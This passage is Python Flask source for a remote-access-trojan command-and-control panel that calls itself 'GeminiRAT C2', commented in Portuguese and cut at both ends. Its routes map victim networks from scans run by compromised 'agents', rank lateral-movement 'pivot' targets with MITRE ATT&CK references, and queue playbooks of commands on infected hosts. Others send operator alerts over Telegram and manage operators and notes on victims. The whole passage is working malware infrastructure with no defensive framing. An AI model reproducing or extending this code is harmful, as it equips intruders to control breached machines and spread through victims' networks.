    # CENÁRIO 1: O usuário já está logado (tem uma sessão ativa).
    if 'logged_in' in session and session.get('logged_in'):
        
        # LOG DE DEBUG PARA CONFIRMAR QUE ESTAMOS NO CAMINHO CERTO
        logger.debug("ROTA /: acesso via sessão ativa. role='%s'", session.get('role'))

        # Pega a role da sessão, com um fallback seguro para 'Observer'.
        user_role = session.get('role', 'Observer')
        
        # Lógica para detectar se é um dispositivo móvel
        user_agent = request.headers.get('User-Agent', '').lower()
        mobile_keywords = ['iphone', 'android', 'webos', 'ipad', 'ipod', 'blackberry', 'windows phone']
        is_mobile = any(keyword in user_agent for keyword in mobile_keywords)

        # Renderiza o template correto, MAS AGORA SEMPRE PASSANDO A 'user_role'.
        if is_mobile:
            # Mesmo que seja mobile, passamos a role (pode ser útil no futuro)
            return render_template('mobile.html', user_role=user_role)
        else:
            # Este é o fluxo principal para o painel desktop
            return render_template('panel.html', user_role=user_role)

    # CENÁRIO 2: O usuário NÃO está logado, mas está tentando acessar com o token.
    provided_token = request.args.get('token')
    if provided_token == C2_ACCESS_TOKEN:
        # O token está correto, mostra a página de login para que ele possa criar uma sessão.
        return render_template('login.html')
    
    # CENÁRIO 3: O usuário não está logado E não tem o token correto.
    log_unauthorized_access()
    return render_template('unauthorized.html'), 403


@app.route('/api/network/map', methods=['GET'])
@login_required
def get_network_map():
    """
    Agrega resultados de network_recon e network_scan de todos os agentes
    e retorna um grafo {nodes, edges} para visualizacao D3.
    """
    try:
        conn = get_db_connection()

        # 1. Todos os agentes conhecidos (com last_seen para dedup)
        agents = conn.execute(
            "SELECT id, hostname, username, internal_ip, external_ip, privileges, status, last_seen FROM agents"
        ).fetchall()

        # 2. network_recon_result armazenado em agent_profile (texto ARP/rotas)
        profiles = conn.execute(
            "SELECT agent_id, network_recon FROM agent_profile WHERE network_recon IS NOT NULL"
        ).fetchall()

        # 3. network_scan_result em tasks (JSON com live_hosts e portas)
        scans = conn.execute(
            """SELECT agent_id, result FROM tasks
               WHERE data_type = 'network_scan_result' AND status = 'completed'
               ORDER BY timestamp_issued DESC"""
        ).fetchall()

        conn.close()

        # --- Dedup agentes por internal_ip ---
        # Mesma maquina re-registra com UUID novo a cada inicializacao do agente.
        # Criterio de preferencia: online > privilegio (Administrator > User) > mais recente.
        def _priv_score(ag):
            try:
                p = (ag['privileges'] or '').lower()
            except (IndexError, KeyError):
                p = ''
            return 1 if p in ('administrator', 'administrador', 'root') else 0

        _canon_by_ip = {}   # internal_ip -> melhor agente
        _agents_no_ip = []
        for ag in agents:
            ip = ag['internal_ip']
            if not ip:
                _agents_no_ip.append(ag)
                continue
            prev = _canon_by_ip.get(ip)
            if prev is None:
                _canon_by_ip[ip] = ag
            elif ag['status'] == 'online' and prev['status'] != 'online':
                _canon_by_ip[ip] = ag  # online tem prioridade
            elif ag['status'] == prev['status'] and _priv_score(ag) > _priv_score(prev):
                _canon_by_ip[ip] = ag  # mesmo status: privilegio maior vence
            elif ag['status'] == prev['status'] and _priv_score(ag) == _priv_score(prev) and (ag['last_seen'] or '') > (prev['last_seen'] or ''):
                _canon_by_ip[ip] = ag  # mesmo status e privilegio: mais recente vence
        agents = list(_canon_by_ip.values()) + _agents_no_ip

        # --- Montar sets de nodes e edges ---
        nodes  = {}   # id -> node dict
        edges  = []
        seen_edges = set()

        IP_RE = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
        SKIP  = {'0.0.0.0', '255.255.255.255', '127.0.0.1'}

        def _skip_ip(ip):
            if ip in SKIP: return True
            parts = ip.split('.')
            if parts[0] in ('224','225','239','240','255'): return True  # multicast/broadcast
            return False

        def _add_edge(src, tgt, etype):
            key = (src, tgt, etype)
            if key not in seen_edges:
                seen_edges.add(key)
                edges.append({"source": src, "target": tgt, "type": etype})

        # Agentes como nodes primarios
        agent_ips = {}  # ip -> agent_id
        for ag in agents:
            nid = f"agent:{ag['id']}"
            nodes[nid] = {
                "id":     nid,
                "type":   "agent",
                "label":  ag['hostname'] or ag['id'][:8],
                "ip":     ag['internal_ip'] or '',
                "ext_ip": ag['external_ip'] or '',
                "status": ag['status'] or 'offline',
            }
            if ag['internal_ip']:
                agent_ips[ag['internal_ip']] = ag['id']

        # Extrair IPs do texto de network_recon (ARP table)
        agent_profile_map = {p['agent_id']: p['network_recon'] for p in profiles}
        for agent_id, recon_text in agent_profile_map.items():
            src_nid = f"agent:{agent_id}"
            if src_nid not in nodes:
                continue
            found_ips = IP_RE.findall(recon_text or '')
            for ip in set(found_ips):
                if _skip_ip(ip): continue
                if ip == nodes[src_nid]['ip']: continue  # proprio agente
                if ip in agent_ips:
                    tgt_nid = f"agent:{agent_ips[ip]}"
                else:
                    tgt_nid = f"host:{ip}"
                    if tgt_nid not in nodes:
                        nodes[tgt_nid] = {
                            "id":     tgt_nid,
                            "type":   "host",
                            "label":  ip,
                            "ip":     ip,
                            "ports":  [],
                            "status": "discovered",
                        }
                _add_edge(src_nid, tgt_nid, "arp")

        # Extrair hosts e portas de network_scan (JSON)
        seen_agent_scan = set()  # usa apenas o scan mais recente por agente
        for row in scans:
            agent_id = row['agent_id']
            if agent_id in seen_agent_scan:
                continue
            seen_agent_scan.add(agent_id)
            src_nid = f"agent:{agent_id}"
            if src_nid not in nodes:
                continue
            try:
                data = json.loads(row['result']) if isinstance(row['result'], str) else row['result']
                scan_results = data.get('scan_results', {})
                for ip, port_data in scan_results.items():
                    if _skip_ip(ip): continue
                    # Suporte a formato antigo (lista de ints) e novo ({port,service,banner})
                    if port_data and isinstance(port_data[0], dict):
                        port_nums = [e['port'] for e in port_data]
                    else:
                        port_nums = port_data or []
                    if ip in agent_ips:
                        tgt_nid = f"agent:{agent_ips[ip]}"
                    else:
                        tgt_nid = f"host:{ip}"
                        if tgt_nid not in nodes:
                            nodes[tgt_nid] = {
                                "id":     tgt_nid,
                                "type":   "host",
                                "label":  ip,
                                "ip":     ip,
                                "ports":  port_nums,
                                "status": "discovered",
                            }
                        else:
                            existing = nodes[tgt_nid].get('ports', [])
                            nodes[tgt_nid]['ports'] = list(set(existing + port_nums))
                    _add_edge(src_nid, tgt_nid, "scan")
            except (ValueError, TypeError, AttributeError):
                continue

        return jsonify({"nodes": list(nodes.values()), "edges": edges}), 200

    except Exception as e:
        logger.error("Falha ao montar mapa de rede: %s", e)
        return jsonify({"error": "Erro interno."}), 500


@app.route('/api/network/pivot_chains', methods=['GET'])
@login_required
def get_pivot_chains():
    """
    Retorna todos os hosts descobertos por agentes como alvos de pivo potenciais.

    Um alvo de pivo e qualquer host que um agente enxerga via network_scan
    ou network_recon (ARP). Quando o IP do host coincide com o IP de outro
    agente conhecido, is_agent=True indica uma rota lateral confirmada
    (MITRE ATT&CK T1021, T1570).

    Retorna lista agrupada por agente de origem:
        {
          "targets": [
            {
              "source":    {id, hostname, username, internal_ip, external_ip, status},
              "pivot_ip":  "192.168.1.50",
              "ports":     [22, 80, 3389],
              "edge_type": "scan" | "arp",
              "is_agent":  true | false,
              "agent":     {id, hostname, ...} | null
            }
          ],
          "total": N
        }
    """
    try:
        conn = get_db_connection()

        agents = conn.execute(
            "SELECT id, hostname, username, internal_ip, external_ip, privileges, status, last_seen FROM agents"
        ).fetchall()

        profiles = conn.execute(
            "SELECT agent_id, network_recon FROM agent_profile WHERE network_recon IS NOT NULL"
        ).fetchall()

        scans = conn.execute(
            """SELECT agent_id, result FROM tasks
               WHERE data_type = 'network_scan_result' AND status = 'completed'
               ORDER BY timestamp_issued DESC"""
        ).fetchall()

        conn.close()

        IP_RE = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
        SKIP  = {'0.0.0.0', '255.255.255.255', '127.0.0.1'}

        def _skip_ip(ip):
            if ip in SKIP: return True
            parts = ip.split('.')
            if len(parts) != 4: return True
            if not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts): return True
            if parts[0] == '0': return True
            if parts[3] in ('0', '255'): return True
            if parts[0] in ('224', '225', '239', '240', '255'): return True
            return False

        # Dedup agentes por internal_ip: online > privilegio (Administrator > User) > mais recente
        # Mesma maquina gera UUID novo a cada re-registro; so o canonical importa.
        def _priv_score_nm(ag):
            try:
                p = (ag['privileges'] or '').lower()
            except (IndexError, KeyError):
                p = ''
            return 1 if p in ('administrator', 'administrador', 'root') else 0

        _canon_by_ip = {}
        _agents_no_ip = []
        for ag in agents:
            ip = ag['internal_ip']
            if not ip:
                _agents_no_ip.append(ag)
                continue
            prev = _canon_by_ip.get(ip)
            if prev is None:
                _canon_by_ip[ip] = ag
            elif ag['status'] == 'online' and prev['status'] != 'online':
                _canon_by_ip[ip] = ag
            elif ag['status'] == prev['status'] and _priv_score_nm(ag) > _priv_score_nm(prev):
                _canon_by_ip[ip] = ag  # privilegio maior vence
            elif ag['status'] == prev['status'] and _priv_score_nm(ag) == _priv_score_nm(prev) and (ag['last_seen'] or '') > (prev['last_seen'] or ''):
                _canon_by_ip[ip] = ag
        canonical_agents = list(_canon_by_ip.values()) + _agents_no_ip

        # uuid_to_canonical: todos os UUIDs de uma mesma maquina apontam para o canonical
        canonical_ip_by_uuid = {}
        for ag in agents:
            canon = _canon_by_ip.get(ag['internal_ip'])
            if canon:
                canonical_ip_by_uuid[ag['id']] = ag['internal_ip']

        agent_by_ip = {}
        agent_by_id = {}
        for ag in canonical_agents:
            d = dict(ag)
            agent_by_id[ag['id']] = d
            if ag['internal_ip']:
                agent_by_ip[ag['internal_ip']] = d
            if ag['external_ip']:
                agent_by_ip.setdefault(ag['external_ip'], d)

        targets = []
        # Chave: (src_internal_ip, pivot_ip) em vez de (src_uuid, pivot_ip)
        # Garante dedup mesmo quando o mesmo host tem multiplos UUIDs no banco.
        seen = set()

        def _src_key(src_id):
            """Retorna o IP interno canonico do agente de origem."""
            return canonical_ip_by_uuid.get(src_id) or src_id

        def _add_target(src_id, pivot_ip, services, etype):
            if _skip_ip(pivot_ip):
                return
            # Resolve para o agente canonical (pode ser UUID diferente do src_id)
            canon_ip = canonical_ip_by_uuid.get(src_id)
            src = agent_by_ip.get(canon_ip) if canon_ip else agent_by_id.get(src_id, {})
            if pivot_ip in (src.get('internal_ip'), src.get('external_ip')):
                return
            key = (_src_key(src_id), pivot_ip)
            if key in seen:
                if etype == 'scan':
                    for t in targets:
                        if t['_key'] == key:
                            existing_ports = {s['port'] for s in t['services']}
                            for svc in services:
                                if svc['port'] not in existing_ports:
                                    t['services'].append(svc)
                            t['services'].sort(key=lambda s: s['port'])
                            t['edge_type'] = 'scan'
                            break
                return
            seen.add(key)
            linked_agent = agent_by_ip.get(pivot_ip)
            if linked_agent and linked_agent.get('internal_ip') == src.get('internal_ip'):
                return  # nao criar auto-loop mesmo com UUID diferente
            targets.append({
                "_key":      key,   # usado no merge; removido antes de retornar
                "source":    src,
                "pivot_ip":  pivot_ip,
                "services":  sorted(services, key=lambda s: s['port']) if services else [],
                "edge_type": etype,
                "is_agent":  linked_agent is not None,
                "agent":     linked_agent,
            })

        # Alvos via network_recon (ARP) -- um por IP de origem
        seen_recon_ips = set()
        for p in profiles:
            src_id = p['agent_id']
            canon_ip = canonical_ip_by_uuid.get(src_id)
            if not canon_ip and src_id not in agent_by_id:
                continue
            key_ip = canon_ip or src_id
            if key_ip in seen_recon_ips:
                continue
            seen_recon_ips.add(key_ip)
            for ip in set(IP_RE.findall(p['network_recon'] or '')):
                _add_target(src_id, ip, [], "arp")

        # Alvos via network_scan -- um scan por IP de origem (mais recente)
        seen_scan_ips = set()
        for row in scans:
            src_id = row['agent_id']
            canon_ip = canonical_ip_by_uuid.get(src_id)
            if not canon_ip and src_id not in agent_by_id:
                continue
            key_ip = canon_ip or src_id
            if key_ip in seen_scan_ips:
                continue
            seen_scan_ips.add(key_ip)
            try:
                data = json.loads(row['result']) if isinstance(row['result'], str) else row['result']
                for ip, port_data in (data.get('scan_results') or {}).items():
                    if port_data and isinstance(port_data[0], dict):
                        services = port_data
                    else:
                        services = [{"port": p, "service": None, "banner": ""} for p in (port_data or [])]
                    _add_target(src_id, ip, services, "scan")
            except (ValueError, TypeError):
                continue

        # Remove campo interno _key antes de serializar
        for t in targets:
            t.pop('_key', None)

        # Ordena: agentes confirmados primeiro, depois por IP
        targets.sort(key=lambda t: (not t['is_agent'], t['pivot_ip']))

        return jsonify({"targets": targets, "total": len(targets)}), 200

    except Exception as e:
        logger.error("Falha ao montar pivot chains: %s", e)
        return jsonify({"error": "Erro interno."}), 500


# ---------------------------------------------------------------------------
# CONFIG ALERTAS TELEGRAM
# ---------------------------------------------------------------------------

@app.route('/api/config/alerts', methods=['GET'])
@login_required
@role_required(['Administrator'])
def get_alert_config():
    """Retorna a configuracao atual de alertas Telegram."""
    return jsonify({
        'bot_token':      _get_setting('tg_bot_token', ''),
        'chat_id':        _get_setting('tg_chat_id', ''),
        'events':         _get_setting('tg_events', ''),
        'bot_enabled':    _get_setting('tg_bot_enabled', '1'),
        'proactive':      _get_setting('tg_proactive_enabled', '1'),
        'alert_types':    _get_setting('tg_alert_types', ','.join(sorted(_TG_DEFAULT_ALERT_TYPES))),
        'inline_kb':      _get_setting('tg_inline_kb', '1'),
    })


@app.route('/api/config/alerts', methods=['POST'])
@login_required
@role_required(['Administrator'])
def save_alert_config():
    """Salva configuracao de alertas Telegram no banco."""
    data = request.get_json(silent=True) or {}
    _set_setting('tg_bot_token',         str(data.get('bot_token', '')).strip())
    _set_setting('tg_chat_id',           str(data.get('chat_id', '')).strip())
    _set_setting('tg_events',            str(data.get('events', '')).strip())
    _set_setting('tg_bot_enabled',       '1' if data.get('bot_enabled') else '0')
    _set_setting('tg_proactive_enabled', '1' if data.get('proactive') else '0')
    _set_setting('tg_alert_types',       str(data.get('alert_types', '')).strip())
    _set_setting('tg_inline_kb',         '1' if data.get('inline_kb') else '0')
    logger.info("[ALERTS] Configuracao Telegram atualizada por %s.", session.get('username'))
    return jsonify({'status': 'ok'})


@app.route('/api/config/retention', methods=['GET'])
@login_required
@role_required(['Administrator'])
def get_retention_config():
    """Retorna configuracao atual de retencao de dados."""
    return jsonify({
        'retention_days': int(_get_setting('retention_days', '0')),
    })


@app.route('/api/config/retention', methods=['POST'])
@login_required
@role_required(['Administrator'])
def set_retention_config():
    """Salva configuracao de retencao de dados."""
    data = request.json or {}
    days = int(data.get('retention_days', 0))
    if days < 0:
        return jsonify({'status': 'error', 'message': 'Valor invalido.'}), 400
    _set_setting('retention_days', str(days))
    logger.info("[RETENTION] Policy atualizada: %d dias (0 = desativado).", days)
    return jsonify({'status': 'ok', 'retention_days': days})


# ============================================================
# PLAYBOOKS
# ============================================================

def _validate_playbook_steps(steps):
    """Valida formato e tamanho dos passos antes de persistir/enfileirar."""
    if not isinstance(steps, list) or not steps:
        return None, 'steps deve ser uma lista nao vazia.'
    if len(steps) > 25:
        return None, 'Um playbook pode conter no maximo 25 passos.'

    normalized = []
    for index, step in enumerate(steps, start=1):
        if not isinstance(step, dict):
            return None, f'Passo {index} deve ser um objeto.'
        command = str(step.get('command', '')).strip()
        if not re.fullmatch(r'[a-z][a-z0-9_]{0,63}', command):
            return None, f'Comando invalido no passo {index}.'
        args = step.get('args', '')
        try:
            encoded_args = json.dumps(args, ensure_ascii=False)
        except (TypeError, ValueError):
            return None, f'Argumentos invalidos no passo {index}.'
        if len(encoded_args.encode('utf-8')) > 64 * 1024:
            return None, f'Argumentos excedem 64 KiB no passo {index}.'
        normalized.append({'command': command, 'args': args})
    return normalized, None

@app.route('/api/playbooks', methods=['GET'])
@login_required
def list_playbooks():
    """Lista todos os playbooks cadastrados."""
    conn = get_db_connection()
    rows = conn.execute('SELECT id, name, description, steps, created_by, created_at FROM playbooks ORDER BY created_at ASC').fetchall()
    conn.close()
    result = []
    for r in rows:
        try:
            steps = json.loads(r['steps'])
        except Exception:
            steps = []
        result.append({
            'id': r['id'], 'name': r['name'], 'description': r['description'],
            'steps': steps, 'created_by': r['created_by'], 'created_at': r['created_at'],
        })
    return jsonify(result)


@app.route('/api/playbook', methods=['POST'])
@login_required
@role_required(['Administrator', 'Operator'])
def create_playbook():
    """Cria um novo playbook personalizado."""
    data = request.get_json(silent=True) or {}
    name  = str(data.get('name', '')).strip()
    desc  = str(data.get('description', '')).strip()
    steps = data.get('steps', [])

    if not name:
        return jsonify({'error': 'name e obrigatorio.'}), 400
    if len(name) > 100 or len(desc) > 1000:
        return jsonify({'error': 'Nome ou descricao excede o limite permitido.'}), 400
    steps, validation_error = _validate_playbook_steps(steps)
    if validation_error:
        return jsonify({'error': validation_error}), 400

    pb_id = str(uuid.uuid4())
    try:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO playbooks (id, name, description, steps, created_by, created_at) VALUES (?,?,?,?,?,?)',
            (pb_id, name, desc, json.dumps(steps), session.get('username'), datetime.now().isoformat())
        )
        conn.commit()
        conn.close()
    except Exception as e:
        return jsonify({'error': str(e)}), 409
    return jsonify({'status': 'ok', 'id': pb_id}), 201


@app.route('/api/playbook/<pb_id>', methods=['DELETE'])
@login_required
@role_required(['Administrator'])
def delete_playbook(pb_id):
    """Remove um playbook. Apenas Administradores podem deletar."""
    conn = get_db_connection()
    row = conn.execute('SELECT created_by FROM playbooks WHERE id = ?', (pb_id,)).fetchone()
    if not row:
        conn.close()
        return jsonify({'error': 'Playbook nao encontrado.'}), 404
    if row['created_by'] == 'system' and session.get('role') != 'Administrator':
        conn.close()
        return jsonify({'error': 'Playbooks do sistema so podem ser removidos por Administradores.'}), 403
    conn.execute('DELETE FROM playbooks WHERE id = ?', (pb_id,))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})


@app.route('/api/playbook/run', methods=['POST'])
@login_required
@role_required(['Administrator', 'Operator'])
def run_playbook():
    """
    Enfileira todos os passos de um playbook para um agente.
    Retorna lista de task_ids criados.
    """
    data     = request.get_json(silent=True) or {}
    pb_id    = data.get('playbook_id')
    agent_id = data.get('agent_id')

    if not pb_id or not agent_id:
        return jsonify({'error': 'playbook_id e agent_id sao obrigatorios.'}), 400

    conn = get_db_connection()
    pb_row = conn.execute('SELECT * FROM playbooks WHERE id = ?', (pb_id,)).fetchone()
    if not pb_row:
        conn.close()
        return jsonify({'error': 'Playbook nao encontrado.'}), 404

    agent_row = conn.execute('SELECT id FROM agents WHERE id = ?', (agent_id,)).fetchone()
    if not agent_row:
        conn.close()
        return jsonify({'error': 'Agente nao encontrado.'}), 404

    try:
        steps = json.loads(pb_row['steps'])
    except Exception:
        conn.close()
        return jsonify({'error': 'Playbook com steps invalidos.'}), 500

    steps, validation_error = _validate_playbook_steps(steps)
    if validation_error:
        conn.close()
        return jsonify({'error': validation_error}), 400

    issued_by = session.get('username')
    now       = datetime.now().isoformat()
    task_ids  = []

    for step in steps:
        cmd  = str(step.get('command', '')).strip()
        args = step.get('args', '')
        if not cmd:
            continue
        tid = str(uuid.uuid4())
        conn.execute(
            '''INSERT INTO tasks (id, agent_id, command, args, status, timestamp_issued, result, data_type, issued_by)
               VALUES (?, ?, ?, ?, 'pending', ?, NULL, NULL, ?)''',
            (tid, agent_id, cmd, json.dumps(args) if isinstance(args, (dict, list)) else (args or ''), now, issued_by)
        )
        task_ids.append({'task_id': tid, 'command': cmd})

    conn.commit()

    # Atualiza tasks_update para o painel
    tasks_rows = conn.execute(
        'SELECT id, command, args, status, timestamp_issued FROM tasks WHERE agent_id = ? ORDER BY timestamp_issued DESC LIMIT 50',
        (agent_id,)
    ).fetchall()
    conn.close()

    socketio.emit('tasks_update', {'agent_id': agent_id, 'tasks': [dict(r) for r in tasks_rows]})
    log_operator_action(issued_by, 'RUN_PLAYBOOK', {'playbook': pb_row['name'], 'agent_id': agent_id, 'steps': len(task_ids)})
    trigger_dashboard_update()

    return jsonify({'status': 'ok', 'tasks': task_ids, 'playbook': pb_row['name']})


@app.route('/api/mitre_stats', methods=['GET'])
@login_required
def mitre_stats():
    """
    Retorna estatisticas de cobertura MITRE ATT&CK baseadas nas tasks executadas.
    Agrupado por tatica, com contagem por tecnica.
    """
    try:
        conn = get_db_connection()
        rows = conn.execute(
            "SELECT command, COUNT(*) as count FROM tasks "
            "WHERE status = 'completed' GROUP BY command"
        ).fetchall()
        conn.close()

        # Agrega por tatica
        by_tactic = {t: [] for t in MITRE_TACTIC_ORDER}
        seen = {}  # (tactic, technique_id) -> entry para evitar duplicatas de comando
        for row in rows:
            cmd = row['command']
            if cmd not in MITRE_COMMAND_MAP:
                continue
            m = MITRE_COMMAND_MAP[cmd]
            tactic = m['tactic']
            key = (tactic, m['id'])
            if key in seen:
                seen[key]['count'] += row['count']
                seen[key]['commands'].append(cmd)
            else:
                entry = {
                    'technique_id': m['id'],
                    'name':         m['name'],
                    'commands':     [cmd],
                    'count':        row['count'],
                }
                seen[key] = entry
                by_tactic[tactic].append(entry)

        # Ordena cada tatica por contagem desc
        for tactic in by_tactic:
            by_tactic[tactic].sort(key=lambda x: x['count'], reverse=True)

        return jsonify({'by_tactic': by_tactic, 'tactic_order': MITRE_TACTIC_ORDER})
    except Exception as e:
        logger.error("/api/mitre_stats: %s", e)
        return jsonify({'error': 'Falha ao coletar estatisticas MITRE'}), 500


@app.route('/api/config/alerts/test', methods=['POST'])
@login_required
@role_required(['Administrator'])
def test_alert():
    """Envia mensagem de teste para o bot Telegram configurado."""
    ok = send_telegram_alert(
        "<b>GeminiRAT C2</b>\n"
        "<b>Teste de alerta</b>\n"
        "Configuracao de alertas funcionando corretamente."
    )
    if ok:
        return jsonify({'status': 'ok', 'message': 'Mensagem enviada com sucesso.'})
    return jsonify({'status': 'error', 'message': 'Falha ao enviar. Verifique token e chat_id.'}), 400


@app.route('/admin/audit')
@login_required
@role_required(['Administrator'])
def admin_audit_page():
    """Audit log: historico de todos os comandos emitidos por operadores."""
    try:
        conn = get_db_connection()

        # Filtros opcionais via query string
        q_operator = request.args.get('operator', '').strip()
        q_agent    = request.args.get('agent', '').strip()
        q_command  = request.args.get('command', '').strip()
        q_status   = request.args.get('status', '').strip()
        q_from     = request.args.get('date_from', '').strip()
        q_to       = request.args.get('date_to', '').strip()
        page       = max(1, int(request.args.get('page', 1)))
        per_page   = 50

        conditions = []
        params     = []

        if q_operator:
            conditions.append("t.issued_by LIKE ?")
            params.append(f"%{q_operator}%")
        if q_agent:
            conditions.append("(a.hostname LIKE ? OR a.id LIKE ?)")
            params.extend([f"%{q_agent}%", f"%{q_agent}%"])
        if q_command:
            conditions.append("t.command LIKE ?")
            params.append(f"%{q_command}%")
        if q_status:
            conditions.append("t.status = ?")
            params.append(q_status)
        if q_from:
            conditions.append("t.timestamp_issued >= ?")
            params.append(q_from)
        if q_to:
            conditions.append("t.timestamp_issued <= ?")
            params.append(q_to + " 23:59:59")

        where = ("WHERE " + " AND ".join(conditions)) if conditions else ""

        total = conn.execute(
            f"SELECT COUNT(*) FROM tasks t LEFT JOIN agents a ON t.agent_id = a.id {where}",
            params
        ).fetchone()[0]

        rows = conn.execute(
            f"""SELECT t.id, t.command, t.args, t.status,
                       t.timestamp_issued, t.updated_at, t.issued_by,
                       a.hostname, a.username AS agent_user, a.id AS agent_id
                FROM tasks t
                LEFT JOIN agents a ON t.agent_id = a.id
                {where}
                ORDER BY t.timestamp_issued DESC
                LIMIT ? OFFSET ?""",
            params + [per_page, (page - 1) * per_page]
        ).fetchall()

        # Listas para filtros dos selects
        operators = [r[0] for r in conn.execute(
            "SELECT DISTINCT issued_by FROM tasks WHERE issued_by IS NOT NULL ORDER BY issued_by"
        ).fetchall()]
        commands = [r[0] for r in conn.execute(
            "SELECT DISTINCT command FROM tasks ORDER BY command"
        ).fetchall()]

        conn.close()

        total_pages = max(1, (total + per_page - 1) // per_page)

        return render_template(
            'audit.html',
            rows=rows,
            total=total,
            page=page,
            total_pages=total_pages,
            operators=operators,
            commands=commands,
            filters=dict(operator=q_operator, agent=q_agent, command=q_command,
                         status=q_status, date_from=q_from, date_to=q_to),
        )
    except Exception as e:
        logger.error("Falha ao carregar audit log: %s", e)
        return "Erro interno.", 500


@app.route('/admin/users')
@login_required
@role_required(['Administrator']) # Apenas Administradores podem ver esta página
def admin_users_page():
    """Renderiza a página de gerenciamento de usuários."""
    try:
        conn = get_db_connection()
        # Busca todos os usuários, exceto a senha, para exibir na tabela
        users = conn.execute("SELECT id, username, role, created_at FROM users ORDER BY id").fetchall()
        conn.close()
        # Renderiza o novo template que você criará
        return render_template('admin_users.html', users=users, current_user_id=session.get('user_id'))
    except Exception as e:
        logger.error("Falha ao carregar a página de gerenciamento de usuários: %s", e)
        return "Erro interno ao carregar a página.", 500

@app.route('/api/users', methods=['POST'])
@login_required
@role_required(['Administrator']) # Apenas Administradores podem criar usuários
def add_user_api():
    """API para adicionar um novo usuário."""
    try:
        data = request.json
        username = data.get('username')
        password = data.get('password')
        role = data.get('role')

        if not all([username, password, role]):
            return jsonify({"status": "error", "message": "Nome de usuário, senha e função são obrigatórios."}), 400
        
        if role not in ['Administrator', 'Operator', 'Observer']:
            return jsonify({"status": "error", "message": "Função inválida."}), 400

        conn = get_db_connection()
        # Verifica se o usuário já existe
        if conn.execute("SELECT id FROM users WHERE username = ?", (username,)).fetchone():
            conn.close()
            return jsonify({"status": "error", "message": "Este nome de usuário já está em uso."}), 409

        
        password_hash = generate_password_hash(password)
        
        conn.execute(
            "INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
            (username, password_hash, role, datetime.now().isoformat())
        )
        conn.commit()
        conn.close()
        
        log_system_event(session.get('username'), "USER_CREATED", f"Usuário '{username}' criado com a função '{role}'.")
        return jsonify({"status": "success", "message": f"Usuário '{username}' criado com sucesso."})

    except Exception as e:
        logger.error("Falha na API de adicionar usuário: %s", e)
        return jsonify({"status": "error", "message": "Erro interno no servidor."}), 500

@app.route('/api/users/<int:user_id>', methods=['DELETE'])
@login_required
@role_required(['Administrator']) # Apenas Administradores podem deletar usuários
def delete_user_api(user_id):
    """API para deletar um usuário."""
    try:
        # Medida de segurança: um administrador não pode deletar a si mesmo.
        if user_id == session.get('user_id'):
            return jsonify({"status": "error", "message": "Você não pode deletar sua própria conta."}), 403

        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Pega o nome de usuário antes de deletar, para o log
        user_to_delete = cursor.execute("SELECT username FROM users WHERE id = ?", (user_id,)).fetchone()
        if not user_to_delete:
            conn.close()
            return jsonify({"status": "error", "message": "Usuário não encontrado."}), 404
        
        username_deleted = user_to_delete['username']

        cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        
        log_system_event(session.get('username'), "USER_DELETED", f"Usuário '{username_deleted}' (ID: {user_id}) foi deletado.")
        return jsonify({"status": "success", "message": "Usuário deletado com sucesso."})

    except Exception as e:
        logger.error("Falha na API de deletar usuário: %s", e)
        return jsonify({"status": "error", "message": "Erro interno no servidor."}), 500


# --- ENDPOINTS DE TAGGING E NOTAS DE AGENTES ---

@app.route('/api/agent/<agent_id>/tags', methods=['POST'])
@login_required
@role_required(['Administrator', 'Operator'])
def set_agent_tags(agent_id):
    """
    Salva as tags de um agente (string CSV: "DC,web,pwned").
    O painel envia a lista completa a cada mudança; o servidor sobrescreve.
    """
    try:
        data = request.get_json()
        if data is None:
            return jsonify({"error": "Payload JSON inválido."}), 400

        # Sanitiza: apenas letras, números, hífens e underscores por tag
        raw = data.get('tags', '')
        tags = [re.sub(r'[^a-z0-9_\-]', '', t.strip().lower()) for t in raw.split(',')]
        tags_clean = ','.join(t for t in tags if t)

        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("UPDATE agents SET tags = ? WHERE id = ?", (tags_clean, agent_id))
        if cursor.rowcount == 0:
            conn.close()
            return jsonify({"error": "Agente não encontrado."}), 404
        conn.commit()
        conn.close()

        logger.info("Tags do agente %s atualizadas: '%s' por %s", agent_id, tags_clean, session.get('username'))
        # Propaga para o painel via WebSocket para atualizar os cards
        socketio.emit('agent_list_update', get_agents_with_status())
        return jsonify({"status": "ok", "tags": tags_clean})

    except Exception as e:
        logger.error("Falha ao salvar tags do agente %s: %s", agent_id, e)
        return jsonify({"error": "Erro interno."}), 500


@app.route('/api/agent/<agent_id>/notes', methods=['POST'])
@login_required
@role_required(['Administrator', 'Operator'])
def set_agent_notes(agent_id):
    """
    Salva as notas livres do operador sobre um agente.
    Chamado automaticamente pelo painel com debounce de 1.2s após digitar.
    """
    try:
        data = request.get_json()
        if data is None:
            return jsonify({"error": "Payload JSON inválido."}), 400

        notes = str(data.get('notes', ''))[:4000]  # limita a 4KB

        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("UPDATE agents SET notes = ? WHERE id = ?", (notes, agent_id))
        if cursor.rowcount == 0:
            conn.close()
            return jsonify({"error": "Agente não encontrado."}), 404
        conn.commit()
        conn.close()

        log_operator_action(session.get('username'), "AGENT_NOTE_UPDATE", {'agent_id': agent_id})
        return jsonify({"status": "ok"})

    except Exception as e:
        logger.error("Falha ao salvar notes do agente %s: %s", agent_id, e)
        return jsonify({"error": "Erro interno."}), 500


@app.route('/api/agent/<agent_id>/profile', methods=['GET'])
@login_required
def get_agent_profile(agent_id):
    """
    Retorna o perfil acumulado do host: última coleta de sysinfo, processos e network_recon.
    Os dados são atualizados automaticamente quando o agente envia resultados dessas tasks.
    """
    try:
        conn = get_db_connection()
        row = conn.execute(
            "SELECT * FROM agent_profile WHERE agent_id = ?", (agent_id,)
        ).fetchone()
        conn.close()

        if not row:
            return jsonify({"agent_id": agent_id, "sysinfo": None, "processes": None, "network_recon": None}), 200

        def _parse(val):
            if val is None:
                return None
            try:
                return json.loads(val)
            except (ValueError, TypeError):
                return val  # retorna como string se não for JSON válido

        return jsonify({
            "agent_id":        agent_id,
